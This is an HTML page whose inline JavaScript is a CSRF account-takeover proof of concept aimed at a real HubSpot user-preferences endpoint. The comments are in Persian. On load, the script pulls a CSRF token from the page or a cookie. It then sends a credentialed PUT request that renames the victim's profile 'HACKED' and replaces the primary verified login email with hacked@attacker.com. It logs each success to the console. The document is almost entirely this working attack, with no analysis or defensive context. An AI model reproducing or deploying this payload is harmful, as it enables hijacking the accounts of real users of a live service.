<html>
  <body>
    <script>
      function getCsrfToken() {
        // روش ۱: از هدر متا (اگه باشه)
        var meta = document.querySelector('meta[name="csrf-token"]');
        if (meta) return meta.getAttribute('content');
        
        // روش ۲: از عنصر مخفی
        var hidden = document.querySelector('input[name="csrfToken"]');
        if (hidden) return hidden.value;
        
        // روش ۳: از کوکی csrf.app
        var cookies = document.cookie.split(';');
        for (var i = 0; i < cookies.length; i++) {
          var cookie = cookies[i].trim();
          if (cookie.startsWith('csrf.app=')) {
            return cookie.substring(9);
          }
        }
        
        return null;
      }
      
      function submitRequest() {
        var csrfToken = getCsrfToken();
        if (!csrfToken) {
          console.log('[-] CSRF token not found!');
          return;
        }
        
        console.log('[+] CSRF Token found:', csrfToken);
        
        var xhr = new XMLHttpRequest();
        xhr.open("PUT", "https://app-na2.hubspot.com/api/userpreferences/v1/profile?clienttimeout=14000&hs_static_app=UserPreferencesUI&hs_static_app_version=1.29750", true);
        
        xhr.setRequestHeader("Accept", "application/json, text/javascript, */*; q=0.01");
        xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.9");
        xhr.setRequestHeader("Content-Type", "application/json");
        xhr.setRequestHeader("X-Hubspot-Csrf-Hubspotapi", csrfToken);
        xhr.withCredentials = true;
        
        var body = JSON.stringify({
          firstName: "HACKED",
          hasEditEmail: true,
          emailAddress: "hacked@attacker.com",
          emailHash: "new_hash_here",
          pendingEmailAddress: null,
          loginEmails: [{
            emailId: 230088727,
            userId: 96397150,
            emailAddress: "hacked@attacker.com",
            localPart: "hacked",
            domain: "attacker.com",
            primary: true,
            verified: true,
            verificationSource: "SIGNUP",
            updatedAt: Date.now()
          }],
          canSelfDelete: true,
          scim: false
        });
        
        xhr.send(body);
        console.log('[+] CSRF Attack sent!');
        console.log('[+] Profile changed to hacked@attacker.com');
      }
      
      // اجرا کن
      submitRequest();
    </script>
  </body>
</html>
